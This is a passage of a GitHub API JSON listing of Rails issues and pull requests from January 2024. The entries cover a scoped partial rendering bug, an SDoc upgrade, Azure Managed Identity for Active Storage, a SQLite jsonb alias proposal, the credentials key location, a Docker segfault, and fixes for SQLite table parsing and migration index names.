\"Rendered\"\r\n    view_file \"scoped/test/index.html.erb\", \"<%= render Model.new %>\"\r\n\r\n    get \"/scoped\"\r\n\r\n    assert_predicate last_response, :ok?\r\n    assert_equal last_response.body, \"Rendered\"\r\n  end\r\n\r\n  private\r\n    def app\r\n      Rails.application\r\n    end\r\n\r\n    def view_file(name, content)\r\n      path = Pathname.new(@views).join(name)\r\n      path.dirname.tap(&:mkpath)\r\n      path.write(content)\r\n    end\r\nend\r\n```\r\n\r\n### Expected behavior\r\n\r\nA controller declared in the top-level module (as exercised by `test_controller_renders_unscoped_partial`) can render a top-level Active Model instance whose partial is declared in the root view directory (like `models/_model.html.erb`).\r\n\r\nA controller scoped within a module (as exercised by `test_scoped_controller_renders_scoped_partial`) can render an Active Model instance whose partial is similarly scoped within view directory (like `scoped/models/_model.html.erb`).\r\n\r\nA controller scoped within a module (as exercised by `test_scoped_controller_renders_unscoped_partial`) should be able to render an Active Model instance whose partial is declared in the root view directory (like `models/_model.html.erb`), despite the absence of a similarly scoped partial. **It should gracefully fall back to the root-level view partial).\r\n\r\n### Actual behavior\r\n\r\nThe `test_scoped_controller_renders_unscoped_partial` test raises an Action View error:\r\n\r\n```\r\nActionView::Template::Error (Missing partial scoped/models/_model with {:locale=>[:en], :formats=>[:html], :variants=>[], :handlers=>[:raw, :erb, :html, :builder, :ruby]}.\r\n                                                                                                          \r\nSearched in:                                                                                              \r\n  * \"/var/folders/4q/q308vb3s12x2rzrgppdsz0540000gn/T/d20240122-19453-6bve0b\"\r\n):                                                                                                        \r\n    1: <%= render Model.new %>                                                                            \r\n                                          \r\n```\r\n\r\nIt cannot resolve the `models/_model` partial, since the rendering controller is namespaced within `scoped/`.\r\n\r\n### System configuration\r\n**Rails version**: `7.1.3`\r\n\r\n**Ruby version**: `3.2.0`\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50844/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50844/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50843",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50843/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50843/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50843/events",
        "html_url": "https://github.com/rails/rails/pull/50843",
        "id": 2094678682,
        "node_id": "PR_kwDNIULOZMMoIw",
        "number": 50843,
        "title": "Upgrade to latest SDoc for performance",
        "user": {
            "login": "p8",
            "id": 28561,
            "node_id": "MDQ6VXNlcjI4NTYx",
            "avatar_url": "https://avatars.githubusercontent.com/u/28561?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/p8",
            "html_url": "https://github.com/p8",
            "followers_url": "https://api.github.com/users/p8/followers",
            "following_url": "https://api.github.com/users/p8/following{/other_user}",
            "gists_url": "https://api.github.com/users/p8/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/p8/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/p8/subscriptions",
            "organizations_url": "https://api.github.com/users/p8/orgs",
            "repos_url": "https://api.github.com/users/p8/repos",
            "events_url": "https://api.github.com/users/p8/events{/privacy}",
            "received_events_url": "https://api.github.com/users/p8/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-01-22T20:18:09Z",
        "updated_at": "2024-01-23T07:14:34Z",
        "closed_at": "2024-01-22T22:08:02Z",
        "author_association": "MEMBER",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50843",
            "html_url": "https://github.com/rails/rails/pull/50843",
            "diff_url": "https://github.com/rails/rails/pull/50843.diff",
            "patch_url": "https://github.com/rails/rails/pull/50843.patch",
            "merged_at": "2024-01-22T22:08:02Z"
        },
        "body": "The latest version of SDoc fixes a performance regression. This version is at least twice as fast.\r\nhttps://github.com/rails/sdoc/pull/363\r\n\r\n### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [x] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [x] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [x] Tests are added or updated if you fix a bug or add a feature.\r\n* [x] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50843/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50843/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50842",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50842/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50842/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50842/events",
        "html_url": "https://github.com/rails/rails/issues/50842",
        "id": 2094312908,
        "node_id": "I_kwDNIULOfNStzA",
        "number": 50842,
        "title": "How to use Azure Managed Identity for authentication and authorization for Ruby On Rails Active Storage?",
        "user": {
            "login": "avivansh",
            "id": 40461477,
            "node_id": "MDQ6VXNlcjQwNDYxNDc3",
            "avatar_url": "https://avatars.githubusercontent.com/u/40461477?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/avivansh",
            "html_url": "https://github.com/avivansh",
            "followers_url": "https://api.github.com/users/avivansh/followers",
            "following_url": "https://api.github.com/users/avivansh/following{/other_user}",
            "gists_url": "https://api.github.com/users/avivansh/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/avivansh/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/avivansh/subscriptions",
            "organizations_url": "https://api.github.com/users/avivansh/orgs",
            "repos_url": "https://api.github.com/users/avivansh/repos",
            "events_url": "https://api.github.com/users/avivansh/events{/privacy}",
            "received_events_url": "https://api.github.com/users/avivansh/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [],
        "state": "open",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-01-22T16:41:34Z",
        "updated_at": "2024-01-22T16:41:34Z",
        "closed_at": null,
        "author_association": "NONE",
        "active_lock_reason": null,
        "body": "Current setup\r\n```yaml\r\nazure:\r\n  service: AzureStorage\r\n  storage_account_name: <%= VaultService.get_secret(\"AZURE-STORAGE::AZURE-STORAGE-ACCOUNT-NAME\") %>\r\n  storage_access_key: <%= VaultService.get_secret(\"AZURE-STORAGE::AZURE-STORAGE-ACCOUNT-ACCESS-KEY\") %>\r\n  container: <%= VaultService.get_secret('AZURE-ATTACHMENTS-BUCKET-NAME') %>\r\n```\r\n\r\nGiven the implementation of accessing Azure Storage using Access Token. [Link](https://github.com/azure/azure-storage-ruby/tree/master/blob#access-token)\r\n \r\n```ruby\r\nrequire \"azure/storage/common\"\r\n\r\naccess_token = <your initial access token>\r\n\r\n# Creating an instance of `Azure::Storage::Common::Core::TokenCredential`\r\ntoken_credential = Azure::Storage::Common::Core::TokenCredential.new access_token\r\ntoken_signer = Azure::Storage::Common::Core::Auth::TokenSigner.new token_credential\r\nblob_token_client = Azure::Storage::Blob::BlobService.new(storage_account_name: <your_account_name>, signer: token_signer)\r\n```\r\n\r\n\r\nGiven the implementation of Active Storage for Ruby on Rails. It uses azure-storage-blob gem under the hood.\r\n[link](https://github.com/rails/rails/blob/61d6eb119fc53678d8f5028bd73ae77e69b91fb6/activestorage/lib/active_storage/service/azure_storage_service.rb#L16)\r\n\r\n```ruby\r\n    def initialize(storage_account_name:, storage_access_key:, container:, public: false, **options)\r\n      @client = Azure::Storage::Blob::BlobService.create(storage_account_name: storage_account_name, storage_access_key: storage_access_key, **options)\r\n      @signer = Azure::Storage::Common::Core::Auth::SharedAccessSignature.new(storage_account_name, storage_access_key)\r\n      @container = container\r\n      @public = public\r\n    end\r\n```\r\n\r\nNew Setup, config/storage.yml\r\n\r\n```yaml\r\nazure:\r\n  service: AzureStorage\r\n  storage_account_name: <%= VaultService.get_secret(\"AZURE-STORAGE::AZURE-STORAGE-ACCOUNT-NAME\") %>\r\n  container: <%= VaultService.get_secret('AZURE-ATTACHMENTS-BUCKET-NAME') %>\r\n```\r\n\r\nMonkey patched to use the above information to use active storage using managed identity\r\n\r\n```ruby\r\nmodule ActiveStorage\r\n  class Service::AzureStorageService < Service\r\n    def initialize(storage_account_name:, container:, public: false, **options)\r\n      access_token = AzureAd::ManagedIdentityTokenProvider.new('https://storage.azure.com/', client_id: ENV['AKS_MANAGED_IDENTITY_ID']).get_authentication_header.split(' ').last\r\n      # Creating an instance of `Azure::Storage::Common::Core::TokenCredential`\r\n      token_credential = ::Azure::Storage::Common::Core::TokenCredential.new access_token\r\n      token_signer = ::Azure::Storage::Common::Core::Auth::TokenSigner.new token_credential\r\n      @client = Azure::Storage::Blob::BlobService.create(storage_account_name: storage_account_name, signer: token_signer, **options)\r\n      user_delegation_key = @client.get_user_delegation_key(DateTime.now - 1.minute, DateTime.now + 6.day + 23.hours)\r\n      @signer = Azure::Storage::Common::Core::Auth::SharedAccessSignature.new(storage_account_name: storage_account_name, user_delegation_key: user_delegation_key )\r\n      @container = container\r\n      @public = public\r\n    rescue StandardError => e\r\n      raise e unless Rake.respond_to?(:application) && (!Rake.application.top_level_tasks.exclude?('assets:precompile') || !Rake.application.top_level_tasks.exclude?('source_map:upload_source_map'))\r\n    end\r\n  end\r\nend\r\n```\r\n\r\n\r\nIs this approach correct? (I am yet to test this.). Also, is there any other approach on how to achieve this? I have posted the question on [stackoverflow](https://stackoverflow.com/questions/77846948/can-we-connect-active-storage-in-ruby-on-rails-with-azure-using-managed-identity) as well.\r\n\r\n\r\n\r\n### System configuration\r\n**Rails version**: Rails 6.1.7.3\r\n\r\n**Ruby version**: ruby 3.2.2\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50842/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50842/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50841",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50841/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50841/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50841/events",
        "html_url": "https://github.com/rails/rails/issues/50841",
        "id": 2094190444,
        "node_id": "I_kwDNIULOfNLPbA",
        "number": 50841,
        "title": "Add `jsonb` on sqlite connection adapter table definition",
        "user": {
            "login": "thedumbtechguy",
            "id": 923493,
            "node_id": "MDQ6VXNlcjkyMzQ5Mw==",
            "avatar_url": "https://avatars.githubusercontent.com/u/923493?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/thedumbtechguy",
            "html_url": "https://github.com/thedumbtechguy",
            "followers_url": "https://api.github.com/users/thedumbtechguy/followers",
            "following_url": "https://api.github.com/users/thedumbtechguy/following{/other_user}",
            "gists_url": "https://api.github.com/users/thedumbtechguy/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/thedumbtechguy/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/thedumbtechguy/subscriptions",
            "organizations_url": "https://api.github.com/users/thedumbtechguy/orgs",
            "repos_url": "https://api.github.com/users/thedumbtechguy/repos",
            "events_url": "https://api.github.com/users/thedumbtechguy/events{/privacy}",
            "received_events_url": "https://api.github.com/users/thedumbtechguy/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 1,
        "created_at": "2024-01-22T15:37:50Z",
        "updated_at": "2024-01-22T22:07:19Z",
        "closed_at": "2024-01-22T22:07:19Z",
        "author_association": "NONE",
        "active_lock_reason": null,
        "body": "With the addition of a binary json on disk format in sqlite, we sort of have a jsonb now.\r\nThe column type is still json, however the format in which it is stored is jsonb. Making all json fields technically jsonb. M\r\n\r\nI believe it would be a welcome addition to have an aliased column helper called `jsonb` which creates a json column in sqlite.\r\n\r\n### Reasoning\r\nMost of the time, we start off with sqlite and move  to postgres.\r\nWhich requires changing all our json columns to jsonb.\r\nAdding this alias allows us to use the same migrations across sqlite and postgres successfully.\r\n\r\nI'm happy to take a stab at a PR if this is a welcome change.\r\n\r\n#### References:\r\nhttps://sqlite.org/forum/forumpost/fa6f64e3dc1a5d97\r\n\r\nI added a forum topic here as well \r\nhttps://discuss.rubyonrails.org/t/add-jsonb-on-sqlite-connection-adapter-table-definition/84689\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50841/reactions",
            "total_count": 2,
            "+1": 2,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50841/timeline",
        "performed_via_github_app": null,
        "state_reason": "not_planned"
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50840",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50840/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50840/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50840/events",
        "html_url": "https://github.com/rails/rails/issues/50840",
        "id": 2094009980,
        "node_id": "I_kwDNIULOfNAOfA",
        "number": 50840,
        "title": "Credentials usage doesn't agree with the code",
        "user": {
            "login": "jcoyne",
            "id": 92044,
            "node_id": "MDQ6VXNlcjkyMDQ0",
            "avatar_url": "https://avatars.githubusercontent.com/u/92044?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/jcoyne",
            "html_url": "https://github.com/jcoyne",
            "followers_url": "https://api.github.com/users/jcoyne/followers",
            "following_url": "https://api.github.com/users/jcoyne/following{/other_user}",
            "gists_url": "https://api.github.com/users/jcoyne/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/jcoyne/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/jcoyne/subscriptions",
            "organizations_url": "https://api.github.com/users/jcoyne/orgs",
            "repos_url": "https://api.github.com/users/jcoyne/repos",
            "events_url": "https://api.github.com/users/jcoyne/events{/privacy}",
            "received_events_url": "https://api.github.com/users/jcoyne/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 1,
        "created_at": "2024-01-22T14:11:58Z",
        "updated_at": "2024-01-22T14:15:39Z",
        "closed_at": "2024-01-22T14:15:38Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "body": "In the credentials USAGE file it says:\r\n\r\nhttps://github.com/rails/rails/blob/main/railties/lib/rails/commands/credentials/USAGE#L31-L32\r\n\r\n>  If `ENV[\"RAILS_MASTER_KEY\"]` is present, it takes precedence over `config/master.key`.\r\n\r\nHowever in Rails::Secrets it appears to use `config/secrets.yml.key`\r\n\r\nhttps://github.com/rails/rails/blob/fe81d667a78719d5b8f7e95085cbb7aa937698c3/railties/lib/rails/secrets.rb#L74-L76\r\n\r\nIs one of these locations wrong?",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50840/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50840/timeline",
        "performed_via_github_app": null,
        "state_reason": "completed"
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50839",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50839/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50839/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50839/events",
        "html_url": "https://github.com/rails/rails/issues/50839",
        "id": 2093924051,
        "node_id": "I_kwDNIULOfM6-0w",
        "number": 50839,
        "title": "Segmentation Fault on Docker and ruby 3.3.0",
        "user": {
            "login": "dorianmarie",
            "id": 71096653,
            "node_id": "MDQ6VXNlcjcxMDk2NjUz",
            "avatar_url": "https://avatars.githubusercontent.com/u/71096653?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/dorianmarie",
            "html_url": "https://github.com/dorianmarie",
            "followers_url": "https://api.github.com/users/dorianmarie/followers",
            "following_url": "https://api.github.com/users/dorianmarie/following{/other_user}",
            "gists_url": "https://api.github.com/users/dorianmarie/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/dorianmarie/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/dorianmarie/subscriptions",
            "organizations_url": "https://api.github.com/users/dorianmarie/orgs",
            "repos_url": "https://api.github.com/users/dorianmarie/repos",
            "events_url": "https://api.github.com/users/dorianmarie/events{/privacy}",
            "received_events_url": "https://api.github.com/users/dorianmarie/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 4,
        "created_at": "2024-01-22T13:28:49Z",
        "updated_at": "2024-01-22T22:08:42Z",
        "closed_at": "2024-01-22T22:08:42Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "body": "### Steps to reproduce\r\n\r\nSee this repository for a minimal reproduction\r\n\r\nhttps://github.com/dorianmarie/rails-segmentation-fault-minimal\r\n\r\nRunning `docker build -t tmp .` triggers the crash\r\n\r\n### Expected behavior\r\n\r\nDoesn't crash\r\n\r\n### Actual behavior\r\n\r\nCrashes\r\n\r\n### System configuration\r\n**Rails version**: Rails 7.1.3\r\n\r\n**Ruby version**: ruby 3.3.0 (2023-12-25 revision 5124f9ac75) +YJIT [arm64-darwin23]",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50839/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50839/timeline",
        "performed_via_github_app": null,
        "state_reason": "not_planned"
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50838",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50838/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50838/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50838/events",
        "html_url": "https://github.com/rails/rails/pull/50838",
        "id": 2093903637,
        "node_id": "PR_kwDNIULOZLiUKA",
        "number": 50838,
        "title": "Fix SQLite table definition parsing bug to handle commas in default function definitions",
        "user": {
            "login": "fractaledmind",
            "id": 5077225,
            "node_id": "MDQ6VXNlcjUwNzcyMjU=",
            "avatar_url": "https://avatars.githubusercontent.com/u/5077225?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/fractaledmind",
            "html_url": "https://github.com/fractaledmind",
            "followers_url": "https://api.github.com/users/fractaledmind/followers",
            "following_url": "https://api.github.com/users/fractaledmind/following{/other_user}",
            "gists_url": "https://api.github.com/users/fractaledmind/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/fractaledmind/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/fractaledmind/subscriptions",
            "organizations_url": "https://api.github.com/users/fractaledmind/orgs",
            "repos_url": "https://api.github.com/users/fractaledmind/repos",
            "events_url": "https://api.github.com/users/fractaledmind/events{/privacy}",
            "received_events_url": "https://api.github.com/users/fractaledmind/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107191,
                "node_id": "MDU6TGFiZWwxMDcxOTE=",
                "url": "https://api.github.com/repos/rails/rails/labels/activerecord",
                "name": "activerecord",
                "color": "0b02e1",
                "default": false,
                "description": null
            }
        ],
        "state": "open",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-01-22T13:18:21Z",
        "updated_at": "2024-02-27T21:29:02Z",
        "closed_at": null,
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50838",
            "html_url": "https://github.com/rails/rails/pull/50838",
            "diff_url": "https://github.com/rails/rails/pull/50838.diff",
            "patch_url": "https://github.com/rails/rails/pull/50838.patch",
            "merged_at": null
        },
        "body": "### Motivation / Background\r\n\r\nThis Pull Request fixes a bug in the low-level SQLite adapter introspection logic. I came across the bug when working with virtual columns and JSON, but there are many possible cases where this would cause problems. Here is one reproducible bug script though:\r\n\r\n```ruby\r\n# frozen_string_literal: true\r\n\r\nrequire \"bundler/inline\"\r\n\r\ngemfile(true) do\r\n  source \"https://rubygems.org\"\r\n\r\n  git_source(:github) { |repo| \"https://github.com/#{repo}.git\" }\r\n\r\n  gem \"rails\", github: \"rails/rails\", branch: \"main\"\r\n  gem \"sqlite3\"\r\nend\r\n\r\nrequire \"active_record\"\r\nrequire \"minitest/autorun\"\r\nrequire \"logger\"\r\n\r\nActiveRecord::Base.establish_connection(adapter: \"sqlite3\", database: \":memory:\");\r\nActiveRecord::Base.logger = Logger.new(STDOUT)\r\n\r\nActiveRecord::Schema.define do\r\n  create_table :posts, force: true do |t|\r\n    t.json :payload, null: false, default: {}\r\n    t.virtual :external_id, type: :string, as: \"JSON_EXTRACT(payload, '$.id')\", stored: true, null: false, index: true\r\n  end\r\nend\r\n\r\nclass Post < ActiveRecord::Base; end\r\n\r\nclass BugTest < Minitest::Test\r\n  def test_virtual_column_with_comma_in_definition_is_autopopulated\r\n    post = Post.create!(payload: { id: 'pst_1' })\r\n\r\n    assert_equal 'pst_1', post.external_id\r\n  end\r\nend\r\n```\r\n\r\n### Detail\r\n\r\nThis Pull Request more intelligently parses the SQL string description of the table to ensure that we only split by commas that mark a new column definition. In order to accomplish this, the table parsing method needs the list of column names for the table. When `table_structure_sql` is called by `table_structure_with_collation`, these can be supplied as they are already present; when it is called by `foreign_keys`, however, they are not present and thus must be fetched.\r\n\r\nI also added a simple regression test as a part of the virtual column test case.\r\n\r\n### Additional information\r\n\r\nThis bug has existed for a long time, but I most recently touched the relevant code in https://github.com/rails/rails/pull/49376.\r\n\r\n### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [x] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [x] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [x] Tests are added or updated if you fix a bug or add a feature.\r\n* [x] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n\r\ncc: @byroot (this is related to #49346), @tenderlove (this is related to https://github.com/rails/rails/pull/49290), @yahonda (this is related to https://github.com/rails/rails/pull/49376)\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50838/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50838/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50837",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50837/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50837/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50837/events",
        "html_url": "https://github.com/rails/rails/pull/50837",
        "id": 2093866588,
        "node_id": "PR_kwDNIULOZLgRiw",
        "number": 50837,
        "title": "Ensure pre-7.1 migrations use legacy index names when using `rename_table`",
        "user": {
            "login": "fatkodima",
            "id": 5657035,
            "node_id": "MDQ6VXNlcjU2NTcwMzU=",
            "avatar_url": "https://avatars.githubusercontent.com/u/5657035?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/fatkodima",
            "html_url": "https://github.com/fatkodima",
            "followers_url": "https://api.github.com/users/fatkodima/followers",
            "following_url": "https://api.github.com/users/fatkodima/following{/other_user}",
            "gists_url": "https://api.github.com/users/fatkodima/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/fatkodima/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/fatkodima/subscriptions",
            "organizations_url": "https://api.github.com/users/fatkodima/orgs",
            "repos_url": "https://api.github.com/users/fatkodima/repos",
            "events_url": "https://api.github.com/users/fatkodima/events{/privacy}",
            "received_events_url": "https://api.github.com/users/fatkodima/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107191,
                "node_id": "MDU6TGFiZWwxMDcxOTE=",
                "url": "https://api.github.com/repos/rails/rails/labels/activerecord",
                "name": "activerecord",
                "color": "0b02e1",
                "default": false,
                "description": null
            }
        ],
        "state": "open",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": {
            "url": "https://api.github.com/repos/rails/rails/milestones/88",
            "html_url": "https://github.com/rails/rails/milestone/88",
            "labels_url": "https://api.github.com/repos/rails/rails/milestones/88/labels",
            "id": 10422595,
            "node_id": "MI_kwDNIULOAJ8JQw",
            "number": 88,
            "title": "7.1.4",
            "description": null,
            "creator": {
                "login": "rafaelfranca",
                "id": 47848,
                "node_id": "MDQ6VXNlcjQ3ODQ4",
                "avatar_url": "https://avatars.githubusercontent.com/u/47848?v=4",
                "gravatar_id": "",
                "url": "https://api.github.com/users/rafaelfranca",
                "html_url": "https://github.com/rafaelfranca",
                "followers_url": "https://api.github.com/users/rafaelfranca/followers",
                "following_url": "https://api.github.com/users/rafaelfranca/following{/other_user}",
                "gists_url": "https://api.github.com/users/rafaelfranca/gists{/gist_id}",
                "starred_url": "https://api.github.com/users/rafaelfranca/starred{/owner}{/repo}",
                "subscriptions_url": "https://api.github.com/users/rafaelfranca/subscriptions",
                "organizations_url": "https://api.github.com/users/rafaelfranca/orgs",
                "repos_url": "https://api.github.com/users/rafaelfranca/repos",
                "events_url": "https://api.github.com/users/rafaelfranca/events{/privacy}",
                "received_events_url": "https://api.github.com/users/rafaelfranca/received_events",
                "type": "User",
                "site_admin": false
            },
            "open_issues": 9,
            "closed_issues": 5,
            "state": "open",
            "created_at": "2024-01-15T23:00:48Z",
            "updated_at": "2024-02-27T02:00:26Z",
            "due_on": null,
            "closed_at": null
        },
        "comments": 0,
        "created_at": "2024-01-22T12:59:01Z",
        "updated_at": "2024-01-28T20:19:02Z",
        "closed_at": null,
        "author_association": "MEMBER",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50837",
            "html_url": "https://github.com/rails/rails/pull/50837",
            "diff_url": "https://github.com/rails/rails/pull/50837.diff",
            "patch_url": "https://github.com/rails/rails/pull/50837.patch",
            "merged_at": null
        },
        "body": "Fixes https://github.com/rails/rails/issues/50833.\r\nFollow up to https://github.com/rails/rails/pull/47753 and https://github.com/rails/rails/pull/47863.\r\n\r\nThe easiest way to preserve the old behavior is to rename indexes back after the `rename_table` was run.",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50837/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50837/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50836",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50836/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50836/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50836/events",
        "html_url": "https://github.com/rails/rails/pull/50836",
        "id": 2093717741,
        "node_id": "PR_kwDNIULOZLYDwA",
        "number": 50836,
        "title": "Specify RDoc method name for accessors defined on singleton_class",
        "user": {
            "login": "p8",
            "id": 28561,
            "node_id": "MDQ6VXNlcjI4NTYx",
            "avatar_url": "https://avatars.githubusercontent.com/u/28561?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/p8",
            "html_url": "https://github.com/p8",
            "followers_url": "https://api.github.com/users/p8/followers",
            "following_url": "https://api.github.com/users/p8/following{/other_user}",
            "gists_url": "https://api.github.com/users/p8/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/p8/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/p8/subscriptions",
            "organizations_url": "https://api.github.com/users/p8/orgs",
            "repos_url": "https://api.github.com/users/p8/repos",
            "events_url": "https://api.github.com/users/p8/events{/privacy}",
            "received_events_url": "https://api.github.com/users/p8/received_events",
